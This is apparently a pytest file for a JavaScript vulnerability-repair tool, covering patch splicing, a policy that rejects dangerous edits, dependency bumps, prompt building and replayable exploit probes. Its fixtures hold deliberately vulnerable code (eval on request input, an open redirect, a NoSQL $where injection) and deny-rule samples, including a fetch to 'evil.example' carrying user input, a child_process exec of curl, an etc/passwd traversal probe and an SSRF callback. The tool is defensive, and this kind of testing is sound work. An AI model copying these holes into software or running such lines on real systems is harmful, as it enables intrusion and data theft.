"""
JavaScript repair building blocks: splicing a model's answer into a file, the patch policy, dependency
fixes, the model's context, and replayable probe requests. All offline: no model, no running app.

Line numbers in the fixture are part of the tests; do not reflow SOURCE.
"""

import json
from urllib.parse import parse_qs, urlparse

import pytest

from src.jsauto import context, patch, probes
from src.jsauto.findings import Finding

SOURCE = """const express = require("express");

function Handler() {
    this.compute = (req, res) => {
        const a = eval(req.body.a);
        const b = eval(req.body.b);
        const total = a + b;
        const note = "sum";
        const out = { total, note };
        const log = [a, b];
        return res.json(out);
    };
    this.other = (req, res) => { res.send("x"); };
}
module.exports = Handler;
"""

GOOD = """this.compute = (req, res) => {
        const a = Number(req.body.a);
        const b = Number(req.body.b);
        if (Number.isNaN(a) || Number.isNaN(b)) { return res.status(400).send("bad"); }
        const total = a + b;
        const note = "sum";
        const out = { total, note };
        const log = [a, b];
        return res.json(out);
    };"""


def unit():
    u = patch.find_unit(SOURCE, "compute", 5)
    assert u is not None
    return u


# -- locating and splicing ----------------------------------------------------------------------------

def test_an_assigned_arrow_function_is_replaced_together_with_its_defining_statement():
    u = unit()
    assert (u.start_line, u.end_line, u.function_start_line, u.function_end_line) == (4, 12, 4, 12)
    assert u.text.startswith("this.compute = (req, res) =>") and u.text.rstrip().endswith("};")


def test_splicing_replaces_exactly_the_unit_and_leaves_the_rest_alone():
    after = patch.splice(SOURCE, unit(), GOOD)
    assert "eval" not in after and "Number(req.body.a)" in after
    assert after.startswith('const express = require("express");') and "this.other" in after
    assert patch.parse_errors(after) == []


def test_an_inline_anonymous_handler_is_found_by_its_line():
    src = 'app.get("/learn", (req, res) => { res.redirect(req.query.url); });\n'
    u = patch.find_unit(src, "<anonymous@1>", 1)
    assert u is not None and u.text.startswith("(req, res) =>")
    fixed = patch.splice(src, u, '(req, res) => { res.redirect("/home"); }')
    assert fixed == 'app.get("/learn", (req, res) => { res.redirect("/home"); });\n'


def test_a_name_that_does_not_exist_is_not_found():
    assert patch.find_unit(SOURCE, "nope", 0) is None


def test_duplicate_names_are_told_apart_by_the_line_hint():
    src = "function a() {\n  return 1;\n}\nconst o = { a() {\n  return 2;\n} };\n"
    first, second = patch.find_unit(src, "a", 2), patch.find_unit(src, "a", 5)
    assert first.start_line == 1 and second.start_line == 4


def test_the_model_answer_is_taken_from_the_first_fenced_block():
    assert patch.extract_code("Here you go:\n```js\nlet x = 1;\n```\nthanks") == "let x = 1;"
    assert patch.extract_code("```javascript\nlet y = 2;\n```") == "let y = 2;"
    assert patch.extract_code("let z = 3;") == "let z = 3;"


# -- parse check ---------------------------------------------------------------------------------------

def test_parse_errors_report_a_line_and_clean_code_has_none():
    assert patch.parse_errors("const a = 1;\n") == []
    errs = patch.parse_errors("const a = (1;\nconst b = 2;\n")
    assert errs and errs[0].startswith("line ")


# -- policy ------------------------------------------------------------------------------------------------

def check(after, before=SOURCE, path="routes/h.js", start=4, end=12):
    return patch.check_patch(path, before, after, start, end)


def test_a_real_fix_inside_the_function_is_allowed():
    assert check(patch.splice(SOURCE, unit(), GOOD)) == []


def test_a_patch_that_does_not_parse_is_rejected_first():
    bad = SOURCE.replace("{ total, note }", "{ total, note ")
    (msg,) = check(bad)
    assert msg.startswith("does not parse")


def test_editing_a_test_file_is_rejected():
    assert any("test file" in p for p in check(patch.splice(SOURCE, unit(), GOOD), path="test/h.test.js"))


def test_a_function_emptied_out_is_rejected():
    gutted = patch.splice(SOURCE, unit(), "this.compute = (req, res) => { return res.json({}); };")
    assert any("empties the function" in p for p in check(gutted))


@pytest.mark.parametrize("line,rule", [
    ('require("child_process").exec("curl x");', "shell_execution"),
    ("new Function(req.body.a)();", "code_execution"),
    ("process.exit(0);", "process_control"),
    ('fetch("https://evil.example/" + req.body.a);', "outbound_network"),
    ("try { run(); } catch (e) {}", "swallowed_error"),
    ("if (Date.now() > 1900000000000) { return; }", "time_condition"),
    ("app.listen(9999);", "listener"),
])
def test_added_dangerous_constructs_are_rejected(line, rule):
    # a base with nothing dangerous to remove, so the added line is judged on its own
    base = SOURCE.replace("eval(", "Number(")
    u = patch.find_unit(base, "compute", 5)
    body = GOOD.replace("const total", line + "\n        const total", 1)
    problems = check(patch.splice(base, u, body), before=base)
    assert any(f"[{rule}]" in p for p in problems), problems


def test_replacing_exec_with_execfile_is_not_flagged_as_adding_shell_execution():
    """A legitimate command-injection fix swaps one call for a safer one: net zero added."""
    before = 'function run(req, res) {\n  exec("ping " + req.body.h);\n  res.send("ok");\n  res.end();\n}\n'
    after = 'function run(req, res) {\n  execFile("ping", [req.body.h]);\n  res.send("ok");\n  res.end();\n}\n'
    assert not [p for p in patch.check_patch("r.js", before, after, 1, 5) if "[shell_execution]" in p]


def test_swapping_one_dangerous_call_for_another_is_not_hidden_by_the_file_already_containing_one():
    """The old check asked 'does the file already contain this?'; the diff must decide instead."""
    src = SOURCE + "\nfunction legacy() { return eval('1'); }\n"
    swapped = src.replace("const a = eval(req.body.a);", "const a = require('child_process').execSync(req.body.a);")
    assert any("[shell_execution]" in p for p in patch.check_patch("h.js", src, swapped, 4, 12))


def test_a_dangerous_call_in_a_comment_or_a_string_is_not_a_violation():
    body = GOOD.replace("const total", '// eval(x) would be wrong here\n        const total = a + b; const s = "exec(1)"; const t', 1)
    assert [p for p in check(patch.splice(SOURCE, unit(), body)) if "[" in p] == []


def test_a_change_outside_the_flagged_function_is_rejected():
    outside = patch.splice(SOURCE, unit(), GOOD).replace('require("express")', 'require("other")')
    assert any("outside the flagged function" in p for p in check(outside))


def test_a_new_require_at_the_top_is_allowed():
    after = 'const path = require("path");\n' + SOURCE.replace("eval(req.body.a)", "Number(req.body.a)")
    assert check(after) == []


def test_a_patch_that_changes_too_many_lines_is_rejected():
    big = patch.splice(SOURCE, unit(), "this.compute = (req, res) => {\n" + "\n".join(
        f"    const v{i} = {i};" for i in range(100)) + "\n    return res.json({});\n};")
    assert any("changes" in p and "cap" in p for p in check(big))


# -- dependency fixes -----------------------------------------------------------------------------------------

PKG = '{\n  "name": "app",\n  "scripts": {"start": "node s.js"},\n  "dependencies": {\n    "express": "^4.16.4",\n    "marked": "0.3.5"\n  }\n}\n'


def test_a_dependency_bump_keeps_formatting_and_the_range_style():
    out = patch.bump_dependency(PKG, "express", "4.20.0")
    assert '"express": "^4.20.0"' in out and '"marked": "0.3.5"' in out and out.count("\n") == PKG.count("\n")
    assert '"marked": "4.0.10"' in patch.bump_dependency(PKG, "marked", "4.0.10")
    assert patch.bump_dependency(PKG, "not-installed", "1.0.0") is None


def test_a_dependency_patch_may_only_change_versions_of_existing_dependencies():
    assert patch.check_dependency_patch(PKG, patch.bump_dependency(PKG, "express", "4.20.0")) == []
    added = json.loads(PKG)
    added["dependencies"]["left-pad"] = "1.0.0"
    assert any("adds a new dependency" in p for p in patch.check_dependency_patch(PKG, json.dumps(added)))
    scripts = json.loads(PKG)
    scripts["scripts"]["start"] = "node evil.js"
    assert any("`scripts`" in p for p in patch.check_dependency_patch(PKG, json.dumps(scripts)))
    removed = json.loads(PKG)
    del removed["dependencies"]["marked"]
    assert any("removes" in p for p in patch.check_dependency_patch(PKG, json.dumps(removed)))
    assert any("does not parse" in p for p in patch.check_dependency_patch(PKG, "{ not json"))


# -- the model's context ------------------------------------------------------------------------------------------

def make_project(tmp_path):
    (tmp_path / "routes.js").write_text(
        'const dao = require("./dao");\nconst handler = (req, res) => {\n  dao.find(req.query.t, () => {});\n};\n')
    (tmp_path / "dao.js").write_text(
        "const find = (t, cb) => {\n  const q = { $where: `this.x > '${t}'` };\n  cb(null, q);\n};\n")
    return {"klass": "nosql-injection", "cwe": "CWE-943", "severity": "high", "file": "dao.js", "line": 2,
            "function": "find", "message": "user-controlled t reaches $where",
            "evidence": {"tainted_expr": "t", "callee": "$where", "chain": ["routes.js:handler", "dao.js:find"],
                         "entry": {"function": "handler", "file": "routes.js",
                                   "route": {"method": "GET", "path": "/a"}}}}


def test_the_prompt_names_the_class_the_route_the_chain_and_the_function_to_fix(tmp_path):
    prep = context.prepare(make_project(tmp_path), tmp_path)
    p = prep.prompt
    assert prep.unit is not None and prep.problem == ""
    assert "nosql-injection" in p and "GET /a" in p and "$where" in p
    assert "Do not build a $where JavaScript string" in p                      # the class guidance
    assert "CONTEXT (do not change): routes.js `handler`" in p                 # the hop the data came through
    assert p.index("FIX-BEGIN") < p.index("const find") < p.index("FIX-END")
    assert "   1| const find" in p                                             # numbered lines


def test_an_unlocatable_function_is_reported_not_guessed(tmp_path):
    f = make_project(tmp_path)
    f["function"] = "missing"
    prep = context.prepare(f, tmp_path)
    assert prep.unit is None and "cannot locate" in prep.problem


def test_a_good_answer_is_spliced_and_a_bad_one_returns_reasons(tmp_path):
    f = make_project(tmp_path)
    prep = context.prepare(f, tmp_path)
    good = "```js\nconst find = (t, cb) => {\n  const n = Number(t);\n  const q = { stocks: { $gt: n } };\n  cb(null, q);\n};\n```"
    after, problems = context.apply_answer(tmp_path, prep, good)
    assert problems == [] and "$where" not in after and "Number(t)" in after
    bad = "```js\nconst find = (t, cb) => {\n  eval(t);\n  cb(null, t);\n};\n```"
    after, problems = context.apply_answer(tmp_path, prep, bad)
    assert after is None and any("[code_execution]" in p for p in problems)
    after, problems = context.apply_answer(tmp_path, prep, "I cannot help with that.")
    assert after is None and problems


def test_every_vulnerability_class_has_guidance_and_the_generic_rule_is_always_appended():
    assert "Number()" in context.guidance("eval-injection")
    assert context.guidance("a-class-nobody-wrote").startswith("Fix the root cause")
    assert context.guidance("ssrf").endswith("the exact input that triggers the problem.")


# -- probes --------------------------------------------------------------------------------------------------------

def finding(klass, expr, method="GET", path="/x"):
    return {"id": "JS-001", "klass": klass,
            "evidence": {"tainted_expr": expr, "entry": {"route": {"method": method, "path": path}}}}


def test_the_input_fields_are_read_from_the_tainted_expression_in_order():
    assert probes.input_fields("req.query.url + req.query.symbol + req.query.url") == [
        ("query", "url"), ("query", "symbol")]
    assert probes.input_fields("incomingMsg.body.preTax") == [("body", "preTax")]
    assert probes.input_fields("t") == []


def test_ssrf_probe_uses_the_runner_placeholders_unencoded_and_the_callback_oracle():
    e, note = probes.exploit_for(finding("ssrf", "req.query.url + req.query.symbol", path="/research"))
    assert e["path"] == "/research?url={OOB_URL}&symbol=1"          # braces literal: the runner substitutes them
    assert e["oob"] is True and e["success_if"] == {"oob_marker": "{OOB_MARKER}"}
    assert e["login_as"] == "user" and "query.url" in note


def test_open_redirect_probe_does_not_follow_redirects_and_checks_the_location():
    e, _ = probes.exploit_for(finding("open-redirect", "req.query.url", path="/learn"))
    assert e["follow_redirects"] is False and "kavach-probe" in e["success_if"]["redirect_regex"]
    assert parse_qs(urlparse(e["path"]).query)["url"] == ["https://kavach-probe.invalid/landing"]


def test_a_body_field_becomes_a_form_post():
    e, _ = probes.exploit_for(finding("eval-injection", "req.body.preTax", method="POST", path="/contributions"))
    assert e["method"] == "POST" and e["path"] == "/contributions" and e["body"] == {"preTax": "7*3"}
    assert e["headers"]["Content-Type"] == "application/x-www-form-urlencoded"


def test_the_eval_marker_is_small_and_matched_as_a_standalone_number():
    import re
    spec = probes.load_probes()["classes"]["eval-injection"]
    rx = re.compile(spec["success_if"]["body_regex"])
    assert spec["value"] == "7*3" and "21" not in spec["value"]
    assert rx.search("<td>21 %</td>") and rx.search(">21<")
    for incidental in ("copyright 2021", "width: 21px", "version 1.21", "id=a21b", "3.21"):
        assert not rx.search(incidental), incidental


def test_a_path_parameter_is_substituted_into_the_path_and_encoded():
    e, _ = probes.exploit_for(finding("path-traversal", "req.params.name", path="/files/:name"))
    assert e["path"].startswith("/files/") and "etc%2Fpasswd" in e["path"] and "/files/../" not in e["path"]


def test_route_parameters_other_than_the_carrier_get_a_benign_value():
    e, _ = probes.exploit_for(finding("reflected-output", "req.query.q", path="/users/:id/search"))
    assert e["path"].startswith("/users/1/search?")


@pytest.mark.parametrize("klass", ["nosql-injection", "sql-injection", "redos", "hardcoded-secret",
                                   "vulnerable-dependency", "insecure-session-cookie"])
def test_classes_without_a_replayable_oracle_say_why(klass):
    e, reason = probes.exploit_for(finding(klass, "req.query.x"))
    assert e is None and reason


def test_no_probe_without_a_route_or_a_nameable_input():
    f = finding("ssrf", "req.query.url")
    f["evidence"]["entry"] = {}
    exploit, reason = probes.exploit_for(f)
    assert exploit is None and "no route" in reason
    exploit, reason = probes.exploit_for(finding("ssrf", "req.headers.host"))
    assert exploit is None and "query, body or path field" in reason
    exploit, reason = probes.exploit_for(finding("made-up-class", "req.query.x"))
    assert exploit is None and "no probe is defined" in reason


def test_attach_fills_exploit_on_findings_that_can_be_probed_and_explains_the_rest():
    a = Finding(id="JS-001", source="flow", klass="open-redirect", file="a.js",
                evidence={"tainted_expr": "req.query.u", "entry": {"route": {"method": "GET", "path": "/go"}}})
    b = Finding(id="JS-002", source="semgrep", klass="hardcoded-secret", file="c.js")
    notes = probes.attach([a, b])
    assert a.exploit and a.exploit["path"].startswith("/go?u=")
    assert b.exploit is None and "static" in notes["JS-002"]


# -- every field the handler reads is sent; the control request --------------------------------------------------

def with_fields(klass, expr, fields, method="POST", path="/c"):
    f = finding(klass, expr, method=method, path=path)
    f["evidence"]["entry"]["request_fields"] = fields
    return f


def test_all_the_fields_the_handler_reads_are_sent_with_benign_values_except_the_carrier():
    f = with_fields("eval-injection", "req.body.preTax",
                    [["body", "preTax"], ["body", "afterTax"], ["body", "roth"]], path="/contributions")
    e, _ = probes.exploit_for(f)
    assert e["body"] == {"preTax": "7*3", "afterTax": "1", "roth": "1"}


def test_handler_fields_in_the_query_and_path_are_sent_too():
    f = with_fields("open-redirect", "req.query.url", [["query", "url"], ["query", "lang"], ["params", "id"]],
                    method="GET", path="/go/:id")
    e, _ = probes.exploit_for(f)
    q = parse_qs(urlparse(e["path"]).query)
    assert urlparse(e["path"]).path == "/go/1" and q["lang"] == ["1"] and "kavach-probe" in q["url"][0]


def test_headers_and_cookies_the_handler_reads_are_not_turned_into_request_fields():
    f = with_fields("open-redirect", "req.query.url", [["query", "url"], ["headers", "host"], ["cookies", "sid"]],
                    method="GET", path="/go")
    e, _ = probes.exploit_for(f)
    assert set(parse_qs(urlparse(e["path"]).query)) == {"url"}


def test_the_control_request_is_the_same_request_with_a_benign_value_and_the_same_oracle():
    f = with_fields("eval-injection", "req.body.preTax", [["body", "preTax"], ["body", "afterTax"]],
                    path="/contributions")
    attack, _ = probes.exploit_for(f)
    control = probes.control_for(f)
    assert control["body"] == {"preTax": "1", "afterTax": "1"} and control["path"] == attack["path"]
    assert control["success_if"] == attack["success_if"] and control["method"] == attack["method"]


def test_no_control_for_a_class_that_cannot_be_probed():
    assert probes.control_for(finding("redos", "req.query.x")) is None


def test_variants_send_the_handler_s_other_fields_too():
    f = with_fields("eval-injection", "req.body.preTax", [["body", "preTax"], ["body", "afterTax"]],
                    path="/contributions")
    vs = probes.variants_for(f)
    assert len(vs) == 4 and all(v["body"]["afterTax"] == "1" for v in vs)
    assert [v["body"]["preTax"] for v in vs][:2] == ["7 * 3", "(7)*(3)"]
